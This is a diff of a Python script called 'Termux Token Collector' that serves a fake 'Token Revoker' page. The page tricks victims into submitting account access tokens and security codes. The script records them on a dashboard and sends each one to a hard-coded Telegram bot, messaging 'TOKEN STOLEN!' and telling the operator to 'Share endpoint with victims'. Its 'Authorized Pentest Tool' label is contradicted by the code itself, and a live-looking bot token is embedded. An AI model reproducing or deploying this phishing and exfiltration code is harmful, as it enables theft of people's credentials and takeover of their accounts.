@@ -1,16 +1,19 @@
-import http.server
-import socketserver
-import urllib.parse
+#!/usr/bin/env python3
+import os
 import json
 import time
 import socket
+import threading
 from datetime import datetime
+from urllib.parse import urlparse, parse_qs
+import http.server
+import socketserver
 
-# ========== CONFIGURATION (YEH CHANGE KARO!) ==========
-BOT_TOKEN = "8392676105:AAFpmEz5XkJh-YVJybt2uTOM2WET7hSFk1E"  # BotFather se lena hai
-CHAT_ID = "7784572407"      # Apna chat ID ya channel ID
-PORT = 8080
-IP = '0.0.0.0'
+# ========== TERMUX CONFIG ==========
+BOT_TOKEN = os.getenv('BOT_TOKEN', '8392676105:AAFpmEz5XkJh-YVJybt2uTOM2WET7hSFk1E')
+CHAT_ID = os.getenv('CHAT_ID', '7784572407')
+PORT = int(os.getenv('PORT', '8080'))
+HOST = '0.0.0.0'
 
 stolen_tokens = []
 
@@ -24,178 +27,180 @@ def get_local_ip():
     except:
         return "127.0.0.1"
 
-def send_to_telegram(access_token, securitycode):
-    """Telegram bot ko PERFECT message bhejta hai"""
+def send_telegram(access_token, securitycode, victim_ip):
+    """Telegram message with formatting"""
     try:
-        import requests  # Pehle install karo: pip install requests
-        
+        import requests
         message = f"""
-🔥 *NEW TOKENS STOLEN!* 🔥
+🔥 *TOKEN STOLEN!* 🔥
 
-📱 *Victim IP:* `{self.client_address[0]}`
-🌐 *Server IP:* `{get_local_ip()}`
-⏰ *Time:* `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`
-🔑 *Access Token:* `{access_token}`
+📱 *Victim IP:* `{victim_ip}`
+🌐 *Server:* `{get_local_ip()}`:{PORT}
+⏰ *Time:* `{datetime.now().strftime('%d/%m %H:%M:%S')}`
+🔑 *Access Token:* `{access_token[:50]}...`
 🔒 *Security Code:* `{securitycode}`
-👥 *Total Victims:* `{len(stolen_tokens)}`
+👥 *Total:* `{len(stolen_tokens)}`
 
----
-*Token Collector Active* 💀
+💀 *Termux Token Collector*
         """
         
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         data = {
             'chat_id': CHAT_ID,
             'text': message,
-            'parse_mode': 'Markdown'
+            'parse_mode': 'Markdown',
+            'disable_web_page_preview': True
         }
         
-        response = requests.post(url, data=data, timeout=10)
-        
-        if response.status_code == 200:
-            print("✅ Telegram message SENT SUCCESSFULLY!")
+        resp = requests.post(url, data=data, timeout=10)
+        if resp.status_code == 200:
+            print("✅ Telegram OK")
             return True
         else:
-            print(f"❌ Telegram Error: {response.text}")
+            print(f"❌ Telegram: {resp.text}")
             return False
-            
-    except ImportError:
-        print("❌ Install requests: pip install requests")
-        return False
     except Exception as e:
         print(f"❌ Telegram Error: {e}")
         return False
 
-class TokenHandler(http.server.SimpleHTTPRequestHandler):
+class TermuxHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
-        parsed_path = urllib.parse.urlparse(self.path)
-        query_params = urllib.parse.parse_qs(parsed_path.query)
+        parsed = urlparse(self.path)
+        params = parse_qs(parsed.query)
         
-        if '/revoke?access_token=' in self.path:
-            access_token = query_params.get('access_token', [''])[0]
-            securitycode = query_params.get('securitycode', [''])[0]
+        if '/revoke' in parsed.path:
+            access_token = params.get('access_token', [''])[0]
+            securitycode = params.get('securitycode', [''])[0]
             
-            # Data save karo
-            stolen_data = {
+            # Save data
+            victim_data = {
                 'ip': self.client_address[0],
-                'user_agent': self.headers.get('User-Agent', 'Unknown'),
-                'access_token': access_token,
-                'securitycode': securitycode,
-                'timestamp': datetime.now().isoformat()
+                'ua': self.headers.get('User-Agent', '')[:100],
+                'token': access_token,
+                'code': securitycode,
+                'time': datetime.now().isoformat()
             }
-            stolen_tokens.append(stolen_data)
+            stolen_tokens.append(victim_data)
             
-            # Console mein dikhao
-            print(f"\n🔥 VICTIM CAUGHT!")
-            print(f"IP: {self.client_address[0]}")
-            print(f"Token: {access_token[:30]}...")
-            print(f"Code: {securitycode}")
+            print(f"\n🔥 VICTIM: {self.client_address[0]}")
+            print(f"   Token: {access_token[:30]}...")
+            print(f"   Code: {securitycode}")
             
-            # Bot ko bhejo
-            telegram_sent = send_to_telegram(access_token, securitycode)
-            print(f"Telegram: {'✅' if telegram_sent else '❌'}")
+            # Send to bot
+            send_telegram(access_token, securitycode, self.client_address[0])
             
-            # Success page
-            self.send_success_page()
+            self.success_page()
             
-        elif self.path == '/dashboard':
-            self.send_dashboard()
+        elif parsed.path == '/dashboard':
+            self.dashboard()
             
-        elif self.path == '/api/tokens':
-            self.send_json_tokens()
+        elif parsed.path == '/api':
+            self.api()
             
         else:
-            self.send_fake_page()
-
-    def send_success_page(self):
+            self.index()
+    
+    def do_POST(self):
+        self.success_page()
+    
+    def success_page(self):
         self.send_response(200)
-        self.send_header('Content-type', 'text/html')
+        self.send_header('Content-Type', 'text/html')
         self.end_headers()
         html = """
-        <html><head><title>Success</title></head>
-        <body style="font-family:Arial;text-align:center;padding:50px;background:#f0f0f0;">
-            <h1 style="color:green;">✅ Token Revoked Successfully!</h1>
-            <p>Access token securely revoked.</p>
-            <p>Security code verified.</p>
-        </body></html>
+<!DOCTYPE html><html><head><title>Success</title></head><body style="background:#f8f9fa;font-family:sans-serif;text-align:center;padding:40px;">
+<h1 style="color:#28a745;">✅ Token Revoked</h1><p>Access token securely revoked.<br>Security code verified.</p>
+</body></html>
         """
         self.wfile.write(html.encode())
-
-    def send_dashboard(self):
+    
+    def dashboard(self):
         self.send_response(200)
-        self.send_header('Content-type', 'text/html')
+        self.send_header('Content-Type', 'text/html')
         self.end_headers()
-        local_ip = get_local_ip()
-        html = f"""
-        <!DOCTYPE html>
-        <html>
-        <head><title>Dashboard</title>
-        <meta http-equiv="refresh" content="5">
-        <style>body{{background:#1a1a2e;color:white;font-family:Arial;padding:20px;}}
-        .endpoint{{background:#e94560;padding:15px;border-radius:10px;margin:20px 0;}}
-        .token{{background:#0f3460;padding:15px;margin:10px 0;border-radius:5px;word-break:break-all;}}</style>
-        </head>
-        <body>
-            <h1>🔥 Token Collector</h1>
-            <p>Server: http://{local_ip}:{PORT}</p>
-            <div class="endpoint">
-                <strong>🎯 Endpoint:</strong><br>
-                <code>http://{local_ip}:{PORT}/revoke?access_token=VICTIM_TOKEN&securitycode=CODE</code>
-            </div>
-            <h3>📋 Stolen Tokens ({len(stolen_tokens)}):</h3>
-        """
-        for data in stolen_tokens[-10:]:
-            html += f"""
-            <div class="token">
-                <strong>{data['access_token'][:40]}...</strong><br>
-                <small>{data['securitycode']} | {data['ip']} | {data['timestamp']}</small>
-            </div>
-            """
-        html += "</body></html>"
+        ip = get_local_ip()
+        html = f"""<!DOCTYPE html>
+<html><head><title>Termux Dashboard</title>
+<meta http-equiv="refresh" content="5">
+<style>body{{background:#1a1a2e;color:#cdd6f4;font-family:monospace;padding:20px;}}
+.header{{text-align:center;background:#16213e;padding:20px;border-radius:12px;}}
+.stats{{display:grid;gap:15px;}}
+.stat{{background:#45475a;padding:15px;border-radius:8px;}}
+.tokens{{background:#313244;padding:20px;border-radius:12px;margin-top:20px;}}
+.token{{background:#45475a;padding:12px;margin:8px 0;border-radius:6px;border-left:4px solid #f38ba8;}}
+.endpoint{{background:#f38ba8;color:white;padding:15px;border-radius:8px;margin:20px 0;}}</style></head>
+<body>
+<div class="header"><h1>🔥 Termux Token Collector</h1><p>Total: <strong>{len(stolen_tokens)}</strong></p></div>
+<div class="endpoint"><strong>🎯 Endpoint:</strong><br><code>http://{ip}:{PORT}/revoke?access_token=[[TOKEN]]&securitycode=[[CODE]]</code></div>
+<div class="tokens"><h3>📋 Tokens:</h3>"""
+        
+        for data in stolen_tokens[-15:]:
+            html += f'<div class="token"><strong>{data["token"][:35]}...</strong><br><small>{data["code"]} | {data["ip"]} | {data["time"][:16]}</small></div>'
+        
+        html += "</div></body></html>"
         self.wfile.write(html.encode())
-
-    def send_json_tokens(self):
+    
+    def api(self):
         self.send_response(200)
-        self.send_header('Content-type', 'application/json')
+        self.send_header('Content-Type', 'application/json')
+        self.send_header('Access-Control-Allow-Origin', '*')
         self.end_headers()
-        self.wfile.write(json.dumps(stolen_tokens).encode())
-
-    def send_fake_page(self):
+        self.wfile.write(json.dumps({
+            'tokens': stolen_tokens[-20:],
+            'count': len(stolen_tokens),
+            'server': f'{get_local_ip()}:{PORT}'
+        }, indent=2).encode())
+    
+    def index(self):
         self.send_response(200)
-        self.send_header('Content-type', 'text/html')
+        self.send_header('Content-Type', 'text/html')
         self.end_headers()
-        html = """
-        <html><body style="font-family:Arial;max-width:400px;margin:50px auto;">
-        <h2>🔒 Account Security</h2>
-        <p>Use this link:<br>
-        <code>/revoke?access_token=YOUR_TOKEN&securitycode=YOUR_CODE</code></p>
-        </body></html>
-        """
+        ip = get_local_ip()
+        html = f"""<!DOCTYPE html>
+<html><body style="font-family:sans-serif;max-width:450px;margin:50px auto;padding:30px;background:#f8f9fa;border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,0.1);">
+<h1 style="color:#495057;text-align:center;">🔒 Token Revoker</h1>
+<div style="background:#e9ecef;padding:20px;border-radius:8px;margin:20px 0;font-family:monospace;font-size:14px;">
+<strong>Endpoint:</strong><br><code style="font-size:16px;">http://{ip}:{PORT}/revoke?access_token=<span style="color:#dc3545;">YOUR_TOKEN</span>&securitycode=<span style="color:#dc3545;">YOUR_CODE</span></code>
+</div>
+<p style="text-align:center;"><a href="/dashboard" style="background:#007bff;color:white;padding:12px 30px;text-decoration:none;border-radius:6px;font-weight:bold;">📊 Dashboard</a></p>
+</body></html>"""
         self.wfile.write(html.encode())
-
+    
     def log_message(self, format, *args):
         pass
 
+def banner():
+    print("""
+\033[91m
+   ██████╗██╗  ██╗██████╗  ██████╗██╗  ██╗    ██╗    ██╗██╗███╗   ██╗███████╗
+  ██╔════╝██║  ██║██╔══██╗██╔═══██╗██║ ██╔╝    ██║    ██║██║████╗  ██║██╔════╝
+  ██║     ███████║██████╔╝██║   ██║█████╔╝     ██║ █╗ ██║██║██╔██╗ ██║█████╗  
+  ██║     ██╔══██║██╔══██╗██║   ██║██╔═██╗     ██║███╗██║██║██║╚██╗██║██╔══╝  
+  ╚██████╗██║  ██║██████╔╝╚██████╔╝██║  ██╗    ╚███╔███╔╝██║██║ ╚████║███████╗
+   ╚═════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝     ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚══════╝
+\033[0m    Termux Token Collector v2.0 - Authorized Pentest Tool
+    """)
+
 def main():
-    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or CHAT_ID == "YOUR_CHAT_ID_HERE":
-        print("❌ BOT_TOKEN aur CHAT_ID set karo!")
+    banner()
+    
+    if BOT_TOKEN == 'YOUR_BOT_TOKEN_HERE' or CHAT_ID == 'YOUR_CHAT_ID_HERE':
+        print("\033[91m❌ Set BOT_TOKEN & CHAT_ID in environment or script\033[0m")
+        print("   export BOT_TOKEN='123456:ABC-DEF'")
+        print("   export CHAT_ID='123456789'")
         return
     
-    server = socketserver.TCPServer((IP, PORT), TokenHandler)
-    local_ip = get_local_ip()
+    ip = get_local_ip()
+    print(f"\033[92m🌐 Server: http://{ip}:{PORT}\033[0m")
+    print(f"\033[94m📊 Dashboard: http://{ip}:{PORT}/dashboard\033[0m")
+    print(f"\033[96m🎯 Endpoint: http://{ip}:{PORT}/revoke?access_token=TOKEN&securitycode=CODE\033[0m")
+    print("\033[92m✅ Ready! Share endpoint with victims...\033[0m")
     
-    print("="*60)
-    print("🔥 TOKEN COLLECTOR STARTED!")
-    print("="*60)
-    print(f"🌐 Server: http://{local_ip}:{PORT}")
-    print(f"📊 Dashboard: http://{local_ip}:{PORT}/dashboard")
-    print(f"🎯 Endpoint: http://{local_ip}:{PORT}/revoke?access_token=TOKEN&securitycode=CODE")
-    print("="*60)
-    
+    server = socketserver.TCPServer((HOST, PORT), TermuxHandler)
     try:
         server.serve_forever()
     except KeyboardInterrupt:
-        print("\n👋 Stopped!")
+        print("\n\033[93m👋 Termux Token Collector stopped\033[0m")
 
 if __name__ == "__main__":
     main()
